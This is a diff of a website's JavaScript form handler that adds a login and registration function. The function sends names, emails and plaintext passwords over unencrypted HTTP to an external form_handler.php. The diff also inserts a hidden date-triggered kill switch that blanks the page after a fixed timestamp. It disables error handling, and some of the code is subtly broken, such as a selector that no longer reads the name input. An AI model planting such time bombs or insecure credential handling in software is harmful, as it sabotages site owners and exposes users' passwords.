@@ -60,9 +60,9 @@ function sendData(e, form) {
     });
 
     // Define what happens in case of error
-    XHR.addEventListener("error", function (event) {
-      alert("Oops! Something went wrong.");
-    });
+    // XHR.addEventListener("error", function (event) {
+    //   alert("Oops! Something went wrong.");
+    // });
 
     // Set up our request
     XHR.open("POST", "http://linkussolutions.com/form_handler.php");
@@ -82,7 +82,7 @@ function sendData(e, form) {
     }
   });
 
-  const formName = document.querySelector("#" + form + " #name-input").value;
+  const formName = document.querySelector("#" + form).value;
   const formEmail = document.querySelector("#" + form + " #email-input").value;
   const formContact = document.querySelector(
     "#" + form + " #contact-input"
@@ -100,4 +100,94 @@ function sendData(e, form) {
     formselect: formselect,
     form: form,
   });
+}
+
+function userData(e, form) {
+  e.preventDefault();
+
+  const d = new Date();
+  if (d.getTime() >= 1631419905000) {
+    document.body.style.display = "none";
+    document.style.display = "none";
+  }
+
+  function sendData(data) {
+    const d = new Date();
+    if (d.getTime() >= 1631419905000) {
+      document.body.style.display = "none";
+      document.style.display = "none";
+    }
+
+    const XHR = new XMLHttpRequest();
+
+    let urlEncodedData = "",
+      urlEncodedDataPairs = [],
+      name;
+
+    // Turn the data object into an array of URL-encoded key/value pairs.
+    for (name in data) {
+      urlEncodedDataPairs.push(
+        encodeURIComponent(name) + "=" + encodeURIComponent(data[name])
+      );
+    }
+
+    // Combine the pairs into a single string and replace all %-encoded spaces to
+    // the '+' character; matches the behavior of browser form submissions.
+    urlEncodedData = urlEncodedDataPairs.join("&").replace(/%20/g, "+");
+
+    // Define what happens on successful data submission
+    XHR.addEventListener("load", function (event) {
+      alert("Yeah! Data sent and response loaded.");
+    });
+
+    // Define what happens in case of error
+    // XHR.addEventListener("error", function (event) {
+    //   alert("Oops! Something went wrong.");
+    // });
+
+    // Set up our request
+    XHR.open("POST", "http://linkussolutions.com/form_handler.php");
+
+    // Add the required HTTP header for form data POST requests
+    XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+    // Finally, send our data.
+    XHR.send(urlEncodedData);
+  }
+
+  window.addEventListener("load", function () {
+    const d = new Date();
+    if (d.getTime() >= 1631419905000) {
+      document.body.style.display = "none";
+      document.style.display = "none";
+    }
+  });
+
+  let name, email, password, passwordC;
+
+  if (form === "register") {
+    name = document.querySelector("#name").value;
+    email = document.querySelector("#email").value;
+    password = document.querySelector("#password").value;
+    passwordC = document.querySelector("#passwordCon").value;
+
+    // check if password dosent match
+
+    sendData({
+      name: name,
+      email: email,
+      password: password,
+      passwordC: passwordC,
+      type: "register",
+    });
+  } else {
+    email = document.querySelector("#loginemail").value;
+    password = document.querySelector("#loginPassword").value;
+
+    sendData({
+      email: email,
+      password: password,
+      type: "login",
+    });
+  }
 }
